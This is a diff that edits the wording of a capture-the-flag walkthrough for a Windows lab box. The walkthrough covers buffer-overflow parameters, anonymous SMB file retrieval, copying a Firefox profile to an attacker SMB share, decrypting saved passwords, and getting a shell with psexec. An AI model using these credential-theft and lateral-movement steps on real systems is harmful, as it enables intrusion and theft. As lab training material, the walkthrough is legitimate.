@@ -52,9 +52,9 @@ Nmap done: 1 IP address (1 host up) scanned in 195.76 seconds
 
 ## Initial Access
 
-`nc 10.10.249.16 31337` and we can see that is a program that echoes anything that we enter.
-If we try a lot of A, it crashes, so this is a buffer overflow machine.
-We then need to get the program so let's try smb shares without creds.
+`nc 10.10.249.16 31337` reveals a program that echoes anything we enter.
+If we input a large number of "A"s, it crashes, indicating this is a buffer overflow machine.
+We need to retrieve the program, so let's try accessing SMB shares without credentials.
 
 ```bash
 $ smbclient --no-pass -L //10.10.249.16          
@@ -89,28 +89,28 @@ getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (22.5 KiloByt
 smb: \Share\> exit
 ```
 
-We have it, now, make the exploit in a win32 machine.
+We have the file. Now, create the exploit on a Win32 machine.
 
 - offset -> `146`
 - bad chars -> `0x00,0x0A`
 - jump address -> `080414C3`
 
-No we can get the user flag.
+Now we can retrieve the user flag.
 
 ## Privilege Escalation
 
-We can see a Firefox.lnk file in the user desktop folder, so we can try to get credentials from firefox.
-We go to `C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles`
+We find a `Firefox.lnk` file in the user's desktop folder, so we attempt to extract credentials from Firefox.
+Navigate to `C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles`.
 
-In kali create a smb share with `impacket-smbserver -smb2support -user test -password test kali `pwd``
+On Kali, create an SMB share with `impacket-smbserver -smb2support -user test -password test kali `pwd``.
 
-Copy the profile folder to kali
+Copy the profile folder to Kali:
 
 ```bash
 copy lfjfn812a.default-release z:\
 ```
 
-Now install firefox decrypt
+Next, install `firefox_decrypt`:
 
 ```bash
 git clone https://github.com/unode/firefox_decrypt.git
@@ -124,7 +124,7 @@ Username: 'mayor'
 Password: '8CL7O1N78MdrCIsV'
 ```
 
-With these creds we try nxc
+With these credentials, we try `nxc`:
 
 ```bash
 nxc smb 10.10.92.113 -u 'mayor' -p '8CL7O1N78MdrCIsV'
@@ -132,7 +132,7 @@ SMB         10.10.92.113    445    GATEKEEPER       [*] Windows 7 Professional 7
 SMB         10.10.92.113    445    GATEKEEPER       [+] gatekeeper\mayor:8CL7O1N78MdrCIsV (Pwn3d!)
 ```
 
-Using impacket-psexec
+Using `impacket-psexec`:
 
 ```bash
 $ impacket-psexec 'mayor':'8CL7O1N78MdrCIsV'@10.10.92.113 
